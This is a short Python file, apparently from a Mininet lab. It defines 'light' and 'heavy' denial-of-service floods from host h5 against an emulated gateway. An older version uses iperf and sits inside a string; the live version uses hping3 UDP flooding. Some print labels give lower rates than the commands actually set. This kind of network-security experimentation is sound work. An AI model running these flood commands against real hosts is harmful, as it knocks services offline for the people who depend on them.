'''
import os
from datetime import datetime

def run_dos_attack(net, mode="light"):
    h5 = net.get('h5')
    target_ip = "10.0.2.2" # h2 (gateway)

    os.makedirs("logs/host", exist_ok=True)
    
    # Hentikan serangan sebelumnya
    h5.cmd("pkill -f iperf")

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if mode == "light":
        print("Running LIGHT DoS (10 Mbps UDP flood)")
        h5.cmd(f"echo '\n===== DoS LIGHT {timestamp} =====' >> logs/host/h5.log")
        h5.cmd(
            f"iperf -c {target_ip} -u -b 50M -t 30 "
            f">> logs/host/h5.log 2>&1 &"
        )

    elif mode == "heavy":
        print("Running HEAVY DoS (100 Mbps UDP flood)")
        h5.cmd(f"echo '\n===== DoS HEAVY {timestamp} =====' >> logs/host/h5.log")
        h5.cmd(
            f"iperf -c {target_ip} -u -b 200M -t 30 "
            f">> logs/host/h5.log 2>&1 &"
        )
'''

import os
from datetime import datetime

def run_dos_attack(net, mode="light"):
    h5 = net.get('h5')
    target_ip = "10.0.2.2"  # h2 (gateway)
    target_port = 5001   

    os.makedirs("logs/host", exist_ok=True)

    # Hentikan serangan sebelumnya
    h5.cmd("pkill -f hping3")

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if mode == "light":
        print("Running LIGHT DoS (Controlled UDP flood)")
        h5.cmd(f"echo '\n===== DoS LIGHT {timestamp} =====' >> logs/host/h5.log")

        # Kirim 20,000 paket per detik (masih terkontrol)
        h5.cmd(
            f"hping3 --udp -p {target_port} -i u50 {target_ip} "
            f">> logs/host/h5.log 2>&1 &"
        )

    elif mode == "heavy":
        print("Running HEAVY DoS (Full UDP flood)")
        h5.cmd(f"echo '\n===== DoS HEAVY {timestamp} =====' >> logs/host/h5.log")

        # Flood maksimal tanpa delay
        h5.cmd(
            f"hping3 --udp --flood -p {target_port} {target_ip} "
            f">> logs/host/h5.log 2>&1 &"
        )

